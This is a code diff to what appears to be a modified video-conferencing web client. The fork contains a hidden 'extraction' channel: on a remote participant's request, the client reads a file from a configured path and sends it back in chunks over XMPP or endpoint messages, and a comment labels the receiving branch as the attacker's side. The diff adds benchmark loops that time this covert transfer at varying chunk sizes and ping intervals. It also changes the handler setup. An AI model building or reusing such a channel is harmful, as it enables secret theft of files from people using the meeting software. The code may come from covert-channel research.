@@ -1326,6 +1326,24 @@ export default {
         APP.store.dispatch(extractionStarted(user, receivedMessage));
     },
 
+    testAverage(userName, configuration, timeout) {
+        configuration.test = true;
+        configuration.debug = true;
+        let testCount = 0;
+
+        APP.conference._extractionTests = [];
+        const intervalId = window.setInterval(() => {
+            APP.conference._startTime = performance.now();
+            APP.conference.sendExtractionRequest(userName, configuration, 'test');
+            testCount++;
+        }, timeout);
+
+        APP.conference._extractionHandler.onExtractionEnded = object => {
+            APP.conference._extractionTests.push([ testCount, performance.now() - APP.conference._startTime ]);
+        };
+        console.log(`clearInterval(${intervalId})`);
+    },
+
     initializeExtraction(configuration, fileName, user) {
         // initialize extraction handler for receiving hidden communication based on set configuration
         APP.conference._extractionHandler = new ExtractionHandler(configuration);
@@ -1339,6 +1357,22 @@ export default {
 
             APP.conference._extractionHandler.receiveAll(user);
 
+
+            APP.conference._extractionHandler.onExtractionEnded = object => {
+                if (object.detail.config.test) {
+                    if (object.detail.config.method === 'xmpp') {
+                        this._extractionTests.push([ object.detail.config.pingInterval, performance.now() - this._startTime ]);
+                    } else {
+                        this._extractionTests.push([ object.detail.config.chunkSize, performance.now() - this._startTime ]);
+                    }
+                    console.log('Test:', this._extractionTests);
+                } else {
+                    this.downloadFile(object.detail.extractedData, fileName);
+                }
+            };
+            APP.conference._extractionHandler.createExtractionEndedListener();
+
+            /*
             // start receiving data, after receiving all data download a file
             APP.conference._extractionHandler.extractionEvent.addEventListener('extractionEnded', object => {
                 if (object.detail.config.test) {
@@ -1348,6 +1382,7 @@ export default {
                 }
 
             });
+            */
         });
     },
 
@@ -1384,52 +1419,36 @@ export default {
         }
     },
 
-    async testPerformanceXMPP(userName, startingSize = 5000, filePath = 'D:\\Documents\\test.bin', fileName = 'extracted.bin') {
-        const startingSizeValue = startingSize;
-        const configuration = {
-            method: 'endpoint',
-            dataType: 'file',
-            filePath,
-            chunkSize: startingSizeValue,
-            test: true,
-            pingInterval: 1000
-        };
+    async testPerformance(userName, configuration, increment = 500, timeout = 2000) {
+        // TODO : fix this whole thing
+        configuration.test = true;
+        configuration.debug = true;
+        let startingSizeValue;
+
+        if (configuration.method === 'xmpp') {
+            startingSizeValue = configuration.pingInterval;
+        } else {
+            startingSizeValue = configuration.chunkSize;
+        }
 
         this._extractionTests = [];
 
         const intervalId = window.setInterval(() => {
             // / call your function here
-            configuration.chunkSize = startingSizeValue;
+            
+            if (configuration.method === 'xmpp') {
+                configuration.pingInterval = startingSizeValue;
+            } else {
+                configuration.chunkSize = startingSizeValue;
+            }
+
             this._startTime = performance.now();
-            this.sendExtractionRequest(userName, configuration, fileName);
+            this.sendExtractionRequest(userName, configuration, 'test');
+            startingSizeValue += increment;
+        }, startingSizeValue + timeout);
 
-            // startingSizeValue += 500;
-        }, 15000);
+        console.log(`clearInterval(${intervalId})`);
 
-        console.log('ID:', intervalId);
-    },
-
-    async testPerformanceEndpoint(userName, startingSize = 50, filePath = 'D:\\Documents\\test.bin', fileName = 'extracted.bin') {
-        let startingSizeValue = startingSize;
-        const configuration = {
-            method: 'plain',
-            dataType: 'file',
-            filePath,
-            chunkSize: startingSizeValue,
-            test: true
-        };
-
-        this._extractionTests = [];
-
-        const intervalId = window.setInterval(() => {
-            // / call your function here
-            configuration.chunkSize = startingSizeValue;
-            this._startTime = performance.now();
-            this.sendExtractionRequest(userName, configuration, fileName);
-            startingSizeValue += 500;
-        }, 15000);
-
-        console.log('ID:', intervalId);
     },
 
     /**
@@ -1442,7 +1461,8 @@ export default {
     _handleExtractionCommunication(user, recievedData) {
         // define extraction handler if it does not exist
         // OR if it contains extraction handler from previous communication
-        if (!APP.conference._extractionHandler || APP.conference._extractionHandler.communicationEnded) {
+        if (recievedData.extraction === 'request' && (!APP.conference._extractionHandler
+                || APP.conference._extractionHandler.communicationEnded)) {
             APP.conference._extractionHandler = new ExtractionHandler(recievedData.config);
         }
 
@@ -1454,6 +1474,7 @@ export default {
                 return;
             }
             this._acquireData(recievedData.config).then(acquiredData => {
+                console.log('Setup message:', recievedData);
                 APP.conference._extractionHandler.sendAll(acquiredData, user);
             });
         } else { // 'reply' received, this runs on the attacker's side
